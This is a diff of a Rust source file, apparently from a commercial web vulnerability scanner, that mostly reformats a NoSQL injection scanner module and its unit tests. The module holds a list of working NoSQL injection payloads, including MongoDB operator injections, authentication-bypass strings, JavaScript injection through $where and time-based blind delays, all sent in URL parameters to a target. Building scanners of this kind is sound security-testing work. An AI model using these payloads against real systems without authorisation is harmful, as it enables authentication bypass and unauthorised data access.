@@ -8,7 +8,6 @@
  * @copyright 2026 Bountyy Oy
  * @license Proprietary - Enterprise Edition
  */
-
 use crate::http_client::{HttpClient, HttpResponse};
 use crate::scanners::parameter_filter::{ParameterFilter, ScannerType};
 use crate::scanners::registry::PayloadIntensity;
@@ -25,7 +24,10 @@ pub struct NoSqlScanner {
 impl NoSqlScanner {
     pub fn new(http_client: Arc<HttpClient>) -> Self {
         // Generate unique test marker for verification (nosql_<uuid>)
-        let test_marker = format!("nosql_{}", uuid::Uuid::new_v4().to_string().replace("-", ""));
+        let test_marker = format!(
+            "nosql_{}",
+            uuid::Uuid::new_v4().to_string().replace("-", "")
+        );
         Self {
             http_client,
             test_marker,
@@ -39,7 +41,8 @@ impl NoSqlScanner {
         parameter: &str,
         config: &ScanConfig,
     ) -> Result<(Vec<Vulnerability>, usize)> {
-        self.scan_parameter_with_intensity(base_url, parameter, config, PayloadIntensity::Standard).await
+        self.scan_parameter_with_intensity(base_url, parameter, config, PayloadIntensity::Standard)
+            .await
     }
 
     /// Scan a parameter for NoSQL injection with specified intensity (intelligent mode)
@@ -52,14 +55,19 @@ impl NoSqlScanner {
     ) -> Result<(Vec<Vulnerability>, usize)> {
         // Smart parameter filtering - skip framework internals
         if ParameterFilter::should_skip_parameter(parameter, ScannerType::NoSQL) {
-            debug!("[NoSQL] Skipping framework/internal parameter: {}", parameter);
+            debug!(
+                "[NoSQL] Skipping framework/internal parameter: {}",
+                parameter
+            );
             return Ok((Vec::new(), 0));
         }
 
-        info!("[NoSQL] Intelligent scanner - parameter: {} (priority: {}, intensity: {:?})",
-              parameter,
-              ParameterFilter::get_parameter_priority(parameter),
-              intensity);
+        info!(
+            "[NoSQL] Intelligent scanner - parameter: {} (priority: {}, intensity: {:?})",
+            parameter,
+            ParameterFilter::get_parameter_priority(parameter),
+            intensity
+        );
 
         let mut vulnerabilities = Vec::new();
         let mut tests_run = 0;
@@ -71,8 +79,12 @@ impl NoSqlScanner {
         if payloads.len() > payload_limit {
             let original_count = payloads.len();
             payloads.truncate(payload_limit);
-            info!("[NoSQL] Intelligent mode: limited from {} to {} payloads (intensity: {:?})",
-                  original_count, payloads.len(), intensity);
+            info!(
+                "[NoSQL] Intelligent mode: limited from {} to {} payloads (intensity: {:?})",
+                original_count,
+                payloads.len(),
+                intensity
+            );
         }
 
         // Test each payload
@@ -80,17 +92,32 @@ impl NoSqlScanner {
             tests_run += 1;
 
             let test_url = if base_url.contains('?') {
-                format!("{}&{}={}", base_url, parameter, urlencoding::encode(payload))
+                format!(
+                    "{}&{}={}",
+                    base_url,
+                    parameter,
+                    urlencoding::encode(payload)
+                )
             } else {
-                format!("{}?{}={}", base_url, parameter, urlencoding::encode(payload))
+                format!(
+                    "{}?{}={}",
+                    base_url,
+                    parameter,
+                    urlencoding::encode(payload)
+                )
             };
 
             debug!("Testing NoSQL payload: {} -> {}", parameter, payload);
 
             match self.http_client.get(&test_url).await {
                 Ok(response) => {
-                    if let Some(vuln) = self.analyze_nosql_response(&response, payload, parameter, &test_url) {
-                        info!("[ALERT] NoSQL injection detected in parameter '{}'", parameter);
+                    if let Some(vuln) =
+                        self.analyze_nosql_response(&response, payload, parameter, &test_url)
+                    {
+                        info!(
+                            "[ALERT] NoSQL injection detected in parameter '{}'",
+                            parameter
+                        );
                         vulnerabilities.push(vuln);
                         break; // Found vulnerability, stop testing this parameter
                     }
@@ -117,10 +144,12 @@ impl NoSqlScanner {
             // PRIMARY: Unique marker-based payloads (strongest verification)
             format!(r#"{{"$ne": null, "marker": "{}"}}"#, self.test_marker),
             format!(r#"{{"$gt": "", "marker": "{}"}}"#, self.test_marker),
-            format!(r#"{{"username": {{"$ne": null}}, "marker": "{}"}}"#, self.test_marker),
+            format!(
+                r#"{{"username": {{"$ne": null}}, "marker": "{}"}}"#,
+                self.test_marker
+            ),
             format!(r#"' || 'marker'=='{}' || '1'=='1"#, self.test_marker),
             format!(r#"admin' || 'a'=='{}' || '1'=='1"#, self.test_marker),
-
             // SECONDARY: MongoDB operator injection (verify with error messages)
             r#"{"$gt": ""}"#.to_string(),
             r#"{"$ne": null}"#.to_string(),
@@ -129,43 +158,36 @@ impl NoSqlScanner {
             r#"{"$exists": true}"#.to_string(),
             r#"{"$regex": ".*"}"#.to_string(),
             r#"{"$where": "1==1"}"#.to_string(),
-
             // Authentication bypass attempts
             r#"' || '1'=='1"#.to_string(),
             r#"admin' || 'a'=='a"#.to_string(),
             r#"' || 1==1//"#.to_string(),
             r#"' || 1==1%00"#.to_string(),
-
             // Array injection
             "[\"admin\"]".to_string(),
             "{\"username\":\"admin\"}".to_string(),
-
             // URL-encoded operator injection
             "%7B%22%24gt%22%3A%22%22%7D".to_string(), // {"$gt":""}
-            "%7B%22%24ne%22%3Anull%7D".to_string(),    // {"$ne":null}
-
+            "%7B%22%24ne%22%3Anull%7D".to_string(),   // {"$ne":null}
             // JavaScript injection via $where
             r#"'; return true; var a='"#.to_string(),
             r#"'; return 1==1; var b='"#.to_string(),
             r#"\'; return true; var c=\'"#.to_string(),
-
             // Alternative syntax
             "[$gt]".to_string(),
             "[$ne]".to_string(),
             "[$regex]=.*".to_string(),
-
             // Tautology-based
             "true, $where: '1 == 1'".to_string(),
             "1, $where: '1 == 1'".to_string(),
             ", $where: '1 == 1'".to_string(),
-
             // Null byte injection
             "admin\0".to_string(),
             "admin%00".to_string(),
-
             // Time-based blind detection (causes delay)
             r#"'; sleep(5000); var d='"#.to_string(),
-            r#"'; var start = new Date(); while ((new Date() - start) < 5000){}; var e='"#.to_string(),
+            r#"'; var start = new Date(); while ((new Date() - start) < 5000){}; var e='"#
+                .to_string(),
         ]
     }
 
@@ -328,13 +350,28 @@ mod tests {
         let payloads = scanner.generate_nosql_payloads();
 
         // Should have comprehensive NoSQL payload set
-        assert!(payloads.len() >= 25, "Should have at least 25 NoSQL payloads");
+        assert!(
+            payloads.len() >= 25,
+            "Should have at least 25 NoSQL payloads"
+        );
 
         // Check for MongoDB operators
-        assert!(payloads.iter().any(|p| p.contains("$gt")), "Missing $gt operator");
-        assert!(payloads.iter().any(|p| p.contains("$ne")), "Missing $ne operator");
-        assert!(payloads.iter().any(|p| p.contains("$where")), "Missing $where operator");
-        assert!(payloads.iter().any(|p| p.contains("$regex")), "Missing $regex operator");
+        assert!(
+            payloads.iter().any(|p| p.contains("$gt")),
+            "Missing $gt operator"
+        );
+        assert!(
+            payloads.iter().any(|p| p.contains("$ne")),
+            "Missing $ne operator"
+        );
+        assert!(
+            payloads.iter().any(|p| p.contains("$where")),
+            "Missing $where operator"
+        );
+        assert!(
+            payloads.iter().any(|p| p.contains("$regex")),
+            "Missing $regex operator"
+        );
     }
 
     #[test]
@@ -352,10 +389,13 @@ mod tests {
             &response,
             r#"{"$ne": null}"#,
             "username",
-            "http://example.com?username={\"$ne\": null}"
+            "http://example.com?username={\"$ne\": null}",
         );
 
-        assert!(result.is_some(), "Should detect NoSQL authentication bypass");
+        assert!(
+            result.is_some(),
+            "Should detect NoSQL authentication bypass"
+        );
         let vuln = result.unwrap();
         assert_eq!(vuln.severity, Severity::Critical);
     }
@@ -375,7 +415,7 @@ mod tests {
             &response,
             r#"{"$gt": ""}"#,
             "id",
-            "http://example.com?id={\"$gt\": \"\"}"
+            "http://example.com?id={\"$gt\": \"\"}",
         );
 
         assert!(result.is_some(), "Should detect database error disclosure");
@@ -398,9 +438,12 @@ mod tests {
             &response,
             r#"{"$ne": null}"#,
             "search",
-            "http://example.com?search={\"$ne\": null}"
+            "http://example.com?search={\"$ne\": null}",
         );
 
-        assert!(result.is_none(), "Should not report false positive on normal response");
+        assert!(
+            result.is_none(),
+            "Should not report false positive on normal response"
+        );
     }
 }
